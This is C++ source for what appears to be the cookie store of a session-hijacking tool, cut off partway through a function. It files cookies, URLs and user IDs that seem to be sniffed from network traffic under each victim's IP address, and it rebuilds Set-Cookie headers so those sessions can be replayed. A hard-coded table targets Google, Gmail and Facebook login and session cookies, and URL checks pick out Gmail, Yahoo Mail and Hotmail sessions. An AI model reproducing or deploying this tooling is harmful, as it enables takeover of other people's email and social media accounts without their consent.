#include "platform.h"
#include "cookiedb.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>

class MyList
{
};


struct SETRESULT {
	char *m_string;
	unsigned m_length;
	unsigned m_max;

	SETRESULT() : m_string(0), m_length(0), m_max(0)
	{
	}

	~SETRESULT()
	{
		m_string = 0;
		m_length = 0;
		m_max = 0;
		/* don't free the string */
	}

	void append(const char *str)
	{
		unsigned len = strlen(str);
		append(str, len);
	}

	void append(const char *str, unsigned len)
	{
  		if (m_length + len >= m_max) {
			unsigned new_max = m_max*2 + 100;
			char *new_str = (char*)malloc(new_max+1);
			if (m_string) {
				memcpy(new_str, m_string, m_length + 1);
				free(m_string);
			}
			m_string = new_str;
			m_max = new_max;

			/* Recursively call this now that we have enough room */
			append(str,len);

		} else {
			memcpy(m_string+m_length, str, len);
			m_length += len;
			m_string[m_length] = '\0';
		}
	}

};

/*Set-Cookie: NAME=VALUE; NAME2=VALUE2; expires=DATE;
path=PATH; domain=DOMAIN_NAME; secure; httponly*/

/**
 * HTML-escaping: This function counts extra space we will need in order to
 * escape strings in HTML.
 */
static unsigned
count_escapes(const char *str)
{
	unsigned result=0;
	unsigned i;
	for (i=0; str[i]; i++)
	switch (str[i]) {
	case '<':
	case '>':
		result += 4;
		break;
	case '&':
		result += 5;
	}
	return result;
}

/**
 * HTML-escaping: copies a string, escaping specific characters
 */
static void
escape_strcpy(char *dst, const char *src)
{
	while (*src) {
		switch (*src) {
		case '<':
			*(dst++) = '&';
			*(dst++) = 'l';
			*(dst++) = 't';
			*(dst++) = ';';
			break;
		case '>':
			*(dst++) = '&';
			*(dst++) = 'g';
			*(dst++) = 't';
			*(dst++) = ';';
			break;
		case '&':
			*(dst++) = '&';
			*(dst++) = 'a';
			*(dst++) = 'm';
			*(dst++) = 'p';
			*(dst++) = ';';
			break;
		default:
			*(dst++) = *src;
		}
		src++;
	}
	*(dst++) = '\0';
}

struct NVPair
{
	char *m_name;
	char *m_value;
	NVPair *m_next;

	NVPair(const char *name="", const char *value="") : m_name(0), m_value(0), m_next(0)
	{
		unsigned len;

		if (*name == 0)
			name = "(empty)";
		if (*value == 0)
			value = "";
		
		len = strlen(name)+1;
		m_name = new char[len];
		memcpy(m_name, name, len);

		add_value(value);
	}

	~NVPair()
	{
		while (m_next) {
			NVPair *x = m_next;
			m_next = x->m_next;
			x->m_next = NULL;
			delete x;
		}

		delete [] m_name;
		delete [] m_value;
	}

	void add_cookie(const char *name, const char *value)
	{
		NVPair *x;

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x && !x->equals(name); x = x->m_next)
			;

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new NVPair(name, value);
			x->m_next = m_next;
			m_next = x;
			return;
		}

		/*
		 * Else replace the current value with the new value
		 */
		x->add_value(value);

	}

	void add_value(const char *value)
	{
		unsigned len;

		if (*value == 0)
			value = "";

		if (m_value != NULL)
			delete [] m_value;

		len = strlen(value)+1;
		m_value = new char[len];
		memcpy(m_value, value, len);
	}

	int equals(const char *name) const
	{
		return strcmp(name, m_name) == 0;
	}
	void retrieve_cookies(NVPair &result) const
	{
		const NVPair *x;
		for (x = this; x; x = x->m_next) {
			if (x->equals("(empty)"))
				continue;
			result.add_cookie(x->m_name, x->m_value);
		}
	}
	void retrieve_setcookies(SETRESULT &result) const
	{
		const NVPair *x;
		for (x = this; x; x = x->m_next) {
			if (x->equals("(empty)"))
				continue;
			result.append(x->m_name);
			result.append("=");
			result.append(x->m_value);
			result.append("; ");
		}
	}

	unsigned list_length() const
	{
		unsigned result=0;
		const NVPair *x;

		for (x=this; x; x = x->m_next) {
			if (x->m_name == NULL || x->m_value == NULL)
				continue;
			result += strlen(x->m_name) + 1 + strlen(x->m_value) + 1
				+ count_escapes(x->m_name) + count_escapes(x->m_value);
		}

		return result+1;
	}

	void append(char *&p) const
	{
		const NVPair *x;

		for (x=this; x; x = x->m_next) {
			if (x->m_name == NULL || x->m_value == NULL)
				continue;
			escape_strcpy(p, x->m_name);
			p += strlen(p)+1;
			escape_strcpy(p, x->m_value);
			p += strlen(p)+1;
		}

		*p = '\0';
		p++;
	}

};

struct CookiePath
{
	char *m_path;
	NVPair *m_nvpair;
	CookiePath *m_next;

	CookiePath(const char *path="(empty)", const char *name="", const char *value="") : m_path(0), m_nvpair(0), m_next(0)
	{
		unsigned len = strlen(path);

		m_path = new char[len+1];
		memcpy(m_path, path, len+1);

		m_nvpair = new NVPair(name, value);
	}

	~CookiePath()
	{
		while (m_next) {
			CookiePath *x = m_next;
			m_next = x->m_next;
			x->m_next = NULL;
			delete x;
		}

		delete m_nvpair;
		delete [] m_path;
	}

	void add_cookie(const char *path, const char *name, const char *value)
	{
		CookiePath *x;

		if (path == NULL || *path == 0)
			path = "(empty)";

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x && !x->equals(path); x = x->m_next)
			;

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new CookiePath(path, name, value);
			x->m_next = m_next;
			m_next = x;
			return;
		}

		/*
		 * Add the rest of the cookie information
		 */
		x->m_nvpair->add_cookie(name, value);
	}

	int equals(const char *path)
	{
		return strcmp(path, m_path) == 0;
	}
	int is_prefix(const char *full) const
	{
		const char *prefix = m_path;
		unsigned full_len = strlen(full);
		unsigned prefix_len = strlen(prefix);

		if (prefix == 0 || prefix_len == 0)
			return 0;

		if (prefix_len > full_len)
			return 0;

		return strnicmp(full, prefix, prefix_len) == 0;
	}

	void retrieve_cookies(const char *path, NVPair &result)
	{
		const CookiePath *x;
		for (x = this; x; x = x->m_next) {
			if (x->is_prefix(path) && x->m_nvpair)
				x->m_nvpair->retrieve_cookies(result);
		}
	}

	void retrieve_setcookies(const char *domain, const char *path, SETRESULT &result)
	{
		const CookiePath *x;
		for (x = this; x; x = x->m_next) {
			if (x->is_prefix(path) && x->m_nvpair) {
				result.append("Set-Cookie: ");
				x->m_nvpair->retrieve_setcookies(result);
				result.append("domain=");
				result.append(domain);
				result.append("; ");
				result.append("path=");
				result.append(x->m_path);
				result.append(";\r\n");
			}
		}
	}

	unsigned list_length() const
	{
		unsigned result=0;
		const CookiePath *x;

		for (x=this; x; x = x->m_next) {
			if (x->m_path == NULL || x->m_nvpair == NULL)
				continue;
			result += strlen(x->m_path) + 1 + x->m_nvpair->list_length();
		}

		return result+1;
	}

	void append(char *&p) const
	{
		const CookiePath *x;

		for (x=this; x; x = x->m_next) {
			if (x->m_path == NULL || x->m_nvpair == NULL)
				continue;
			strcpy(p, x->m_path);
			p += strlen(p)+1;
			x->m_nvpair->append(p);
		}

		*p = '\0';
		p++;
	}

};

struct CookieDomain
{
	char *m_domain;
	CookiePath *m_path;
	CookieDomain *m_next;

	CookieDomain(const char *domain="", const char *path="", const char *name="", const char *value="") : m_domain(0), m_path(0), m_next(0)
	{
		unsigned len = strlen(domain)+1;

		m_domain = new char[len];
		memcpy(m_domain, domain, len);

		m_path = new CookiePath(path, name, value);

	}

	~CookieDomain()
	{
		while (m_next) {
			CookieDomain *x = m_next;
			m_next = x->m_next;
			x->m_next = NULL;
			delete x;
		}

		delete m_path;
		delete [] m_domain;
	}

	void add_cookie(const char *domain, const char *path, const char *name, const char *value)
	{
		CookieDomain *x;

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x && !x->equals(domain); x = x->m_next)
			;

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new CookieDomain(domain, path, name, value);
			x->m_next = m_next;
			m_next = x;
			return;
		}

		/*
		 * Add the rest of the cookie information
		 */
		x->m_path->add_cookie(path, name, value);
	}

	int equals(const char *domain)
	{
		return strcmp(domain, m_domain) == 0;
	}
	int is_suffix(const char *full) const
	{
		const char *suffix = m_domain;
		unsigned suffix_len = strlen(suffix);
		unsigned full_len = strlen(full);

		if (suffix_len == 0)
			return 0;

		if (suffix_len > full_len)
			return 0;

		return strnicmp(full+full_len-suffix_len, suffix, suffix_len) == 0;
	}
	void retrieve_cookies(const char *domain, const char *path, NVPair &result)
	{
		const CookieDomain *x;
		for (x = this; x; x = x->m_next) {
			if (x->is_suffix(domain) && x->m_path)
				x->m_path->retrieve_cookies(path, result);
		}
	}
	void retrieve_setcookies(const char *domain, const char *path, SETRESULT &result)
	{
		const CookieDomain *x;
		for (x = this; x; x = x->m_next) {
			if (x->is_suffix(domain) && x->m_path)
				x->m_path->retrieve_setcookies(x->m_domain, path, result);
		}
	}

	unsigned list_length() const
	{
		unsigned result=0;
		const CookieDomain *x;

		for (x=this; x; x = x->m_next) {
			if (x->m_domain == NULL || x->m_domain[0] == '\0' || x->m_path == NULL)
				continue;
			result += strlen(x->m_domain) + 1 + x->m_path->list_length();
		}

		return result+1;
	}

	void append(char *&p) const
	{
		const CookieDomain *x;

		for (x=this; x; x = x->m_next) {
			if (x->m_domain == NULL || x->m_domain[0] == '\0' || x->m_path == NULL)
				continue;
			strcpy(p, x->m_domain);
			p += strlen(p)+1;
			x->m_path->append(p);
		}

		*p = '\0';
		p++;
	}
};

struct CookieUrl
{
	char *m_host;
	char *m_url;
	char *m_referer;
	CookieUrl *m_next;

	CookieUrl(const char *host="", const char *url="", const char *referer="") 
		: m_host(0), m_url(0), m_referer(0), m_next(0)
	{
		add_url_referer(host, url, referer);
	}

	~CookieUrl()
	{
		while (m_next) {
			CookieUrl *x = m_next;
			m_next = x->m_next;
			x->m_next = NULL;
			delete x;
		}

		delete [] m_host;
		delete [] m_url;
		delete [] m_referer;
	}

	void add_url_referer(const char *host, const char *url, const char *referer)
	{
		CookieUrl *x;

		if (m_url == NULL) {
			unsigned len = strlen(url)+1;

			m_url = new char[len];
			memcpy(m_url, url, len);

			len = strlen(host)+1;
			m_host = new char[len];
			memcpy(m_host, host, len);

			len = strlen(referer)+1;
			m_referer = new char[len];
			memcpy(m_referer, referer, len);

			return;
		}

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x; x = x->m_next) {
			if (x->equals(host, url)) {
				delete [] m_referer;
				m_referer = new char[strlen(referer)+1];
				strcpy(m_referer, referer);
				return;
			}
		}

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new CookieUrl(host, url, referer);
			x->m_next = m_next;
			m_next = x;
			return;
		}
	}

	int equals(const char *host, const char *url) const
	{
		return strcmp(url, m_url) == 0 && stricmp(host, m_host) == 0;
	}

	char *retrieve_referer(const char *domain, const char *url)
	{
		const CookieUrl *x;
		for (x = this; x; x = x->m_next) {
			if (x->equals(domain, url) && x->m_referer) {
				unsigned len=0;

				len = strlen(x->m_referer);
				char *result = new char [len+1];
				strcpy(result, x->m_referer);
				return result;
			}
		}

		{
			char *result = new char[1];
			memcpy(result, "", 1);
			return result;
		}

	}


	char *get_list() const
	{
		unsigned list_size = 0;
		const CookieUrl *x;
		char *result;
		char *p;

		for (x=this; x; x = x->m_next) {
			if (x->m_host == NULL || x->m_url == NULL)
				continue;
			list_size += strlen(x->m_host)+1;
			list_size += strlen(x->m_url)+1;
		}

		result = (char*)malloc(list_size+1);
		p = result;

		for (x=this; x; x = x->m_next) {
			if (x->m_host == NULL || x->m_url == NULL)
				continue;
			strcpy(p, x->m_host);
			p += strlen(p)+1;
			strcpy(p, x->m_url);
			p += strlen(p)+1;
		}

		*p = '\0';

		return result;
	}
};


struct CookieInstance
{
	char *m_instance;
	
	CookieDomain *m_domain;

	CookieInstance *m_next;

	CookieUrl *m_url;
	
	/** well-known URLs */
	CookieUrl *m_url2;

	CookieUrl *m_userid;

	CookieInstance(const char *instance="", const char *domain="", const char *path="", const char *name="", const char *value="") 
		:  m_instance(0), m_domain(0), m_next(0), m_url(0), m_url2(0), m_userid(0)
	{
		unsigned len = strlen(instance)+1;
		m_instance = new char [len];
		memcpy(m_instance, instance, len);

		m_domain = new CookieDomain(domain, path, name, value);
	}

	~CookieInstance()
	{
		while (m_next) {
			CookieInstance *x = m_next;
			m_next = x->m_next;
			x->m_next = NULL;
			delete x;
		}

		delete m_domain;
		delete [] m_instance;
	}

	void add_cookie(const char *instance, const char *domain, const char *path, const char *name, const char *value)
	{
		CookieInstance *x;

		if (instance[0] == 0 || domain[0] == 0 || path[0] == 0 || name == 0 || value == 0)
			return;

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x && !x->equals(instance); x = x->m_next)
			;

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new CookieInstance(instance, domain, path, name, value);
			x->m_next = m_next;
			m_next = x;
			return;
		}

		/*
		 * Add the rest of the cookie information
		 */
		x->m_domain->add_cookie(domain, path, name, value);
	}

	void add_url_referer(const char *instance, const char *host, const char *url, const char *referer)
	{
		CookieInstance *x;

		if (this->equals(instance)) {
			if (this->m_url == NULL)
				this->m_url = new CookieUrl(host, url, referer);
			else
				this->m_url->add_url_referer(host, url, referer);
			return;
		}

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x && !x->equals(instance); x = x->m_next)
			;

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new CookieInstance(instance, "", "", "", "");
			x->add_url_referer(instance, host, url, referer);
			x->m_next = m_next;
			m_next = x;
			return;
		}

		/*
		 * Add the rest of the cookie information
		 */
		x->add_url_referer(instance, host, url, referer);
	}
	
	void add_url2(const char *instance, const char *host, const char *url)
	{
		CookieInstance *x;

		if (this->equals(instance)) {
			if (this->m_url2 == NULL)
				this->m_url2 = new CookieUrl(host, url, "");
			else
				this->m_url2->add_url_referer(host, url, "");
			return;
		}

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x && !x->equals(instance); x = x->m_next)
			;

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new CookieInstance(instance, "", "", "", "");
			x->add_url2(instance, host, url);
			x->m_next = m_next;
			m_next = x;
			return;
		}

		/*
		 * Add the rest of the cookie information
		 */
		x->add_url2(instance, host, url);
	}

	void add_userid(const char *instance, const char *userid)
	{
		CookieInstance *x;
		const char *host = "-";

		if (this->equals(instance)) {
			if (this->m_userid == NULL)
				this->m_userid = new CookieUrl(host, userid);
			else
				this->m_userid->add_url_referer(host, userid, "");
			return;
		}

		/* 
		 * Search for a matching name 
		 */
		for (x = this; x && !x->equals(instance); x = x->m_next)
			;

		/*
		 * If we don't find the given name, create a new name
		 */
		if (x == NULL) {
			x = new CookieInstance(instance, "", "", "", "");
			x->add_userid(instance, userid);
			x->m_next = m_next;
			m_next = x;
			return;
		}

		/*
		 * Add the rest of the cookie information
		 */
		x->add_userid(instance, userid);
	}

	int equals(const char *instance) const
	{
		return strcmp(instance, m_instance) == 0;
	}

	CookieInstance *lookup(const char *instance)
	{
		CookieInstance *x;
		for (x = this; x && !x->equals(instance); x = x->m_next)
			;
		return x;
	}
	const CookieInstance *lookup(const char *instance) const
	{
		const CookieInstance *x;
		for (x = this; x && !x->equals(instance); x = x->m_next)
			;
		return x;
	}

	unsigned get_instance_count() const
	{
		unsigned result = 0;
		const CookieInstance *x;
		for (x = this; x; x = x->m_next) {
			result++;
		}
		result++;
		return result-2;
	}
	char *get_instance_list() const
	{
		char *result;
		char *p;
		unsigned list_size = 0;
		const CookieInstance *x;
		for (x = this; x; x = x->m_next) {
			if (x->m_instance == NULL || x->m_instance[0] == '\0')
				continue;

			list_size += strlen(x->m_instance)+1;
		}

		result = (char*)malloc(list_size+1);
		p = result;

		for (x = this; x; x = x->m_next) {
			if (x->m_instance == NULL || x->m_instance[0] == '\0')
				continue;

			strcpy(p, x->m_instance);
			p += strlen(p)+1;
		}

		*p = '\0';

		return result;
	}

	char *get_cookie_list() const
	{
		char *result;
		char *p;
		unsigned list_size = 0;

		if (m_domain == NULL) {
			result = (char*)malloc(1);
			*result = '\0';
			return result;
		}

		list_size = m_domain->list_length();
		result = (char*)malloc(list_size);
		p = result;

		m_domain->append(p);
		return result;
	}

	void retrieve_cookies(const char *instance, const char *domain, const char *path, NVPair &result)
	{
		const CookieInstance *x;
		for (x = this; x; x = x->m_next) {
			if (x->equals(instance) && x->m_domain)
				x->m_domain->retrieve_cookies(domain, path, result);
		}
	}
	void retrieve_setcookies(const char *instance, const char *domain, const char *path, SETRESULT &result)
	{
		const CookieInstance *x;
		for (x = this; x; x = x->m_next) {
			if (x->equals(instance) && x->m_domain)
				x->m_domain->retrieve_setcookies(domain, path, result);
		}
	}
	char *retrieve_referer(const char *instance, const char *domain, const char *path)
	{
		const CookieInstance *x;
		for (x = this; x; x = x->m_next) {
			if (x->equals(instance) && x->m_url)
				return x->m_url->retrieve_referer(domain, path);
		}
		{
			char *result = new char[1];
			result[0] = '\0';
			return result;
		}
	}
};

struct CookieDB
{
	CookieInstance m_instances;

	CRITICAL_SECTION   cs;
    
	CookieDB()
	{
		InitializeCriticalSection(&cs);
	}

	~CookieDB()
	{
		DeleteCriticalSection(&cs);
	}

	void add_cookie(const char *instance, const char *domain, const char *path, const char *name, const char *value)
	{
		EnterCriticalSection(&cs);
		m_instances.add_cookie(instance, domain, path, name, value);
		LeaveCriticalSection(&cs);
	}

	void add_cookie(const char *instance, 
		const char *domain, unsigned domain_length, 
		const char *path, unsigned path_length,
		const char *name, unsigned name_length,
		const char *value, unsigned value_length)
	{
		char *xdomain;
		char *xpath;
		char *xname;
		char *xvalue;

		xdomain = (char*)alloca(domain_length+1);
		sprintf_s(xdomain, domain_length+1, "%.*s", domain_length, domain);

		xpath = (char*)alloca(path_length+1);
		sprintf_s(xpath, path_length+1, "%.*s", path_length, path);

		xname = (char*)alloca(name_length+1);
		sprintf_s(xname, name_length+1, "%.*s", name_length, name);

		xvalue = (char*)alloca(value_length+1);
		sprintf_s(xvalue, value_length+1, "%.*s", value_length, value);

		EnterCriticalSection(&cs);
		m_instances.add_cookie(instance, xdomain, xpath, xname, xvalue);
		LeaveCriticalSection(&cs);
	}

	void add_url_referer(const char *instance, const char *host, const char *url, const char *referer)
	{
		EnterCriticalSection(&cs);
		m_instances.add_url_referer(instance, host, url, referer);
		LeaveCriticalSection(&cs);
	}
	void add_url2(const char *instance, const char *host, const char *url)
	{
		EnterCriticalSection(&cs);
		m_instances.add_url2(instance, host, url);
		LeaveCriticalSection(&cs);
	}
	void add_userid(const char *instance, const char *url)
	{
		EnterCriticalSection(&cs);
		m_instances.add_userid(instance, url);
		LeaveCriticalSection(&cs);
	}
	char *get_instance_list()
	{
		EnterCriticalSection(&cs);
		char *result =  m_instances.get_instance_list();
		LeaveCriticalSection(&cs);
		return result;
	}
	unsigned get_instance_count()
	{
		EnterCriticalSection(&cs);
		unsigned result =  m_instances.get_instance_count();
		LeaveCriticalSection(&cs);
		return result;
	}
	char *get_url_list(const char *instance)
	{
		char *result;

		EnterCriticalSection(&cs);

		const CookieInstance *x = m_instances.lookup(instance);
		if (x == NULL || x->m_url == NULL) {
			result = (char*)malloc(1);
			*result = '\0';
		} else
			result = x->m_url->get_list();
		LeaveCriticalSection(&cs);
		return result;
	}
	char *get_url2_list(const char *instance)
	{
		char *result;

		EnterCriticalSection(&cs);

		const CookieInstance *x = m_instances.lookup(instance);
		if (x == NULL || x->m_url2 == NULL) {
			result = (char*)malloc(1);
			*result = '\0';
		} else
			result = x->m_url2->get_list();
		LeaveCriticalSection(&cs);
		return result;
	}
	int is_empty(const char *instance)
	{
		int result;

		EnterCriticalSection(&cs);

		const CookieInstance *x = m_instances.lookup(instance);
		if (x == NULL || x->m_url == NULL)
			result = 1;
		else
			result = 0;
		LeaveCriticalSection(&cs);
		return result;
	}
	char *get_userid_list(const char *instance)
	{
		char *result;

		EnterCriticalSection(&cs);

		const CookieInstance *x = m_instances.lookup(instance);
		if (x == NULL || x->m_userid == NULL) {
			result = (char*)malloc(1);
			*result = '\0';
		} else
			result = x->m_userid->get_list();

		char *p = result;
		for (p=result; *p; ) {
			p += strlen(p);
			*p = ' ';
			p += strlen(p);
			*p = ' ';
			p++;
		}
		LeaveCriticalSection(&cs);
		return result;
	}

	char *get_cookie_list(const char *instance)
	{
		char *result;

		EnterCriticalSection(&cs);

		const CookieInstance *x = m_instances.lookup(instance);
		if (x == NULL || x->m_domain == NULL) {
			result = (char*)malloc(1);
			*result = '\0';
		} else
			result = x->get_cookie_list();
		LeaveCriticalSection(&cs);
		return result;
	}
	char *retrieve_cookies(const char *instance, const char *domain, const char *path)
	{
		char *result;
		NVPair tmp;
		NVPair *x;

		EnterCriticalSection(&cs);
		m_instances.retrieve_cookies(instance, domain, path, tmp);
		LeaveCriticalSection(&cs);

		unsigned len=0;

		for (x = &tmp; x; x = x->m_next) {
			if (x->equals("(empty"))
				continue;
			len += strlen(x->m_name) + 1 + strlen(x->m_value) + 2;
		}

		result = (char*)malloc(len+1);
		result[0] = '\0';
		char *p = result;

		for (x = &tmp; x; x = x->m_next) {
			if (x->equals("(empty)"))
				continue;

			strcpy(p, x->m_name);
			strcat(p, "=");
			strcat(p, x->m_value);
			strcat(p, "; ");
			p += strlen(p);
		}
		if (result[0] && result[1] && strcmp(result+strlen(result)-2, "; ")==0)
			result[strlen(result)-2] = '\0';

		return result;
	}
	char *retrieve_setcookies(const char *instance, const char *domain, const char *path)
	{
		char *result;
		SETRESULT tmp;

		EnterCriticalSection(&cs);
		m_instances.retrieve_setcookies(instance, domain, path, tmp);
		LeaveCriticalSection(&cs);

		result = tmp.m_string;
		return result;
	}

	char *retrieve_referer(const char *instance, const char *domain, const char *path)
	{
		char *result;

		EnterCriticalSection(&cs);
		result = m_instances.retrieve_referer(instance, domain, path);
		LeaveCriticalSection(&cs);

		return result;
	}


	void free(void *p) const
	{
		::free(p);
	}


} db;

int get_item(const char *item, char *&line, char *&value)
{
	unsigned item_length = strlen(item);
	unsigned line_length = strlen(line);

	/* Ignore empty lines */
	if (line_length == 0)
		return 0;

	/* Ignore short lines */
	if (item_length > line_length)
		return 0;

	/* Match the line name, return false if it doesn't match */
	if (strnicmp(line, item, item_length) != 0)
		return 0;

	/* Matched! Now move forward and remove whitespace */
	memmove(line, line+item_length, line_length-item_length+1);
	while (*line && isspace(*line))
		memmove(line, line+1, strlen(line));

	value = line;

	line += line_length+1;
	return 1;
}

extern "C" char *cookiedb_get_instance_list()
{
	return db.get_instance_list();
}
extern "C" unsigned cookiedb_get_instance_count()
{
	return db.get_instance_count();
}
extern "C" char *cookiedb_get_url_list(const char *instance)
{
	return db.get_url_list(instance);
}
extern "C" char *cookiedb_get_url2_list(const char *instance)
{
	return db.get_url2_list(instance);
}
extern "C" char *cookiedb_get_userid_list(const char *instance)
{
	return db.get_userid_list(instance);
}
extern "C" int cookiedb_is_empty(const char *instance)
{
	return db.is_empty(instance);
}
extern "C" char *cookiedb_get_cookie_list(const char *instance)
{
	return db.get_cookie_list(instance);
}

extern "C" void cookiedb_free(void *p)
{
	db.free(p);
}

int ends_with(const char *filename, const char *extension)
{
	unsigned filename_length = strlen(filename);
	unsigned extension_length = strlen(extension);

	if (filename_length < extension_length)
		return 0;

	return strnicmp(filename+filename_length-extension_length, extension, extension_length) == 0;
}

void do_truncate(char *path, const char *sample)
{
	if (memcmp(path, sample, strlen(sample)) == 0)
		strcpy(path, sample);

}

static unsigned 
starts_with(const void *vpx, unsigned length, const char *prefix)
{
	const unsigned char *px = (const unsigned char*)vpx;
	unsigned i;

	if (strlen(prefix) > length)
		return 0;

	for (i=0; i<length && prefix[i]; i++) {
		if (toupper(prefix[i]) != toupper(px[i]))
			return 0;
	}
	if (prefix[i] == '\0')
		return 1;
	return 0;
}

static unsigned 
contains(const void *vpx, unsigned length, const char *prefix)
{
	const unsigned char *px = (const unsigned char*)vpx;
	unsigned i=0;
	unsigned j;

	if (strlen(prefix) > length)
		return 0;

	for (j=0; j<length; j++) {
		for (i=0; i+j<length && prefix[i]; i++) {
			if (toupper(prefix[i]) == toupper(px[i+j])) {
				if (strnicmp(prefix+i, (const char*)px+i+j, strlen(prefix)) == 0)
					return 1;
			}
		}
	}
	return 0;
}

char *path_item(const char *src, unsigned src_length)
{
	unsigned i;
	char *result;

	for (i=0; i<src_length && src[i] != '/' && src[i] != '\\'; i++)
		;

	result = (char*)malloc(i+1);
	memcpy(result, src, i);
	result[i] = '\0';

	return result;
}

struct SetCookieFilter {
	const char *domain;
	const char *name;
	const char *path;
	const char *sendfor;
	const char *expires;
} cookie_filter[] = {
	{".google.com",		"TZ",		"/",				"any",		"session"}, /* timezone */
	{".google.com",		"SNID",		"/verify",			"any",		"6 months"},
	{".google.com",		"NID",		"/",				"any",		"6 months"},
	{".google.com",		"khcookie", "/maptilecompress", "any",		"session"},
	{".google.com",		"khcookie", "/kh",				"any",		"session"},
	{".google.com",		"SID",		"/",				"any",		"session"},
	{".google.com",		"__utma",	"/accounts/",		"any",		"8 months"},
	{".google.com",		"__utma",	"/mail/",			"any",		"8 months"},
	{".google.com",		"__utmx",	"/mail/",			"any",		"8 months"},
	{".google.com",		"PREF",		"/",				"any",		"2 years"},
	{"www.google.com",	"SS",		"/search",			"any",		"session"},
	{"www.google.com",	"LSID",		"/accounts",		"secure",	"session"},
	{"www.google.com",	"GoogleAccountsLocale_session", "/accounts/", "any",		"session"}, /* local, e.g. "en" */
	{"www.google.com",	"GAUSER",	"/accounts",		"secure",	"session"},
	{"www.google.com",	"ERR",		"/calendar/",		"any",		"1 year"},
	{"www.google.com",	"secid",	"/calendar",		"any",		"session"},
	{"www.google.com",	"S",		"/calendar/",		"any",		"1 year"},
	{"www.google.com",	"g314-scope","/corporate/green/","any",		"2 year"},
	{".www.google.com",	"CAL",		"/calendar",		"any",		"session"},

	{"mail.google.com",	"gmailchat","/mail",			"any",		"1 day"},
	{"mail.google.com",	"GMAIL_AT",	"/mail",			"any",		"1 day"},
	{"mail.google.com",	"S",		"/mail",			"any",		"1 day"},
	{"mail.google.com",	"GMAIL_STAT_2867","/mail",		"any",		"session"},
	{"mail.google.com",	"GMAIL_IMP","/mail",			"any",		"session"},
	{"mail.google.com",	"GMAIL_HELP","/mail",			"any",		"session"},
	{"mail.google.com",	"GMAIL_STAT","/mail",			"any",		"session"},
	{"mail.google.com",	"GMAIL_SU",	"/mail",			"any",		"session"},
	{"mail.google.com",	"GBE",		"/mail",			"any",		"session"},
	{"mail.google.com",	"jscookietest","/mail/",		"any",		"session"},
	{".mail.google.com","GX",		"/mail",			"any",		"session"},
	{".mail.google.com","GXSP",		"/mail",			"any",		"session"}, /* on simple UI, but not AJAX UI? */
	
	{".facebook.com",	"xs",		"/",				"any",		"1 month"},
	{".facebook.com",	"login_x",	"/",				"any",		"3 months"},
	{".facebook.com",	"presence",	"/",				"any",		"session"},
	{".facebook.com",	"made_write_conn",	"/",		"any",		"1 day"},
	{".facebook.com",	"cur_max_lag","/",				"any",		"session"},
	{".facebook.com",	"x-referer","/",				"any",		"session"},
	{".facebook.com",	"isfbe",	"/",				"any",		"session"},
	{".facebook.com",	"h_user",	"/",				"any",		"1 day"},
	{".facebook.com",	"sid",		"/",				"any",		"session"},
	{".facebook.com",	"c_user",	"/",				"any",		"1 month"},
	{".facebook.com",	"ABT",		"/",				"any",		"1 week"},
	{".facebook.com",	"login",	"/",				"any",		"session"},
	{".facebook.com",	"test_cookie","/",				"any",		"session"},
	{".facebook.com",	"datr",		"/",				"any",		"3 month"},
	{".facebook.com",	"growth_reg_test_2","/",		"any",		"1 week"},
	{0,0,0,0}
};

void filter_cookie(char *domain, char *path, const char *name)
{
	unsigned i;

	for (i=0; cookie_filter[i].domain; i++) {
		struct SetCookieFilter *f = &cookie_filter[i];
		if (strcmp(name, f->name) != 0)
			continue;

		if (ends_with(domain, f->domain) || (f->domain[0] == '.' && ends_with(domain, f->domain+1))) {
			if (starts_with(path, strlen(path), f->path)) {
				strcpy(domain, f->domain);
				strcpy(path, f->path);
				return;
			}
		}
	}
}

unsigned cookiedb_record_count = 0;
unsigned cookiedb_packet_count = 0;

extern "C" void 
cookiedb_read_chunk(char *chunk, unsigned chunk_length)
{
	char *line = chunk;
	char *instance;
	char *domain;
	char *userid;
	char *url;
	char *referer;
	char *path;
	char *name;
	char *value;
	char *packetcount;

	/* Make sure we have an empty line at the end */
	if (chunk_length < 2 && memcmp(chunk+chunk_length-2, "\0\0", 2) != 0)
		return;


	if (get_item("Packets:", line, packetcount)) {
		cookiedb_packet_count += atoi(packetcount);
		return;
	}

	cookiedb_record_count++;

	/*
	 * Instance
	 */
	if (!get_item("Instance:", line, instance))
		return;

	while (instance[0] == '[')
		memmove(instance, instance+1, strlen(instance));
	while (instance[0] && instance[strlen(instance)-1] == ']')
		instance[strlen(instance)-1] = '\0';

	/*
	 * Domain
	 */
	if (get_item("User-ID:", line, userid)) {
		db.add_userid(instance, userid);
		return;
	}
	if (!get_item("Domain:", line, domain))
		return;
	while (*domain == '.')
		memmove(domain, domain+1, strlen(domain));

	/*
	 * URL
	 */
	if (get_item("Url:", line, url)) {
		unsigned url_length = strlen(url);
		unsigned domain_length = strlen(domain);

		/* Google Mail:
		Instance: 10.0.0.43
		Domain: mail.google.com
		URL: /mail/channel/bind?at=9df28ee2f6ffe67a-111b2f68fe9&VER=4&RID=81251&CVER=2&zx=bc9l7r-jqwxj8&it=132297
		*/
		if (contains(url, url_length, "/channel/bind") && ends_with(domain, "mail.google.com")) {
			if (starts_with(url, url_length, "/a/")) {
				char *subdomain = path_item(url+3, url_length-3);
				db.add_url2(instance, "mail.google.com/a/", subdomain);
				free(subdomain);
			} else
				db.add_url2(instance, "mail.google.com", "/mail");
		}

		/* Yahoo! Mail */
		if (starts_with(domain, domain_length, "us.f") && ends_with(domain, ".mail.yahoo.com")) {
			db.add_url2(instance, domain, "/ym/login?nojs=1");
		}

		/* Hotmail*/
		if (ends_with(domain, ".mail.live.com")) {
			if (starts_with(url, url_length, "/mail/InboxLight.aspx")) {
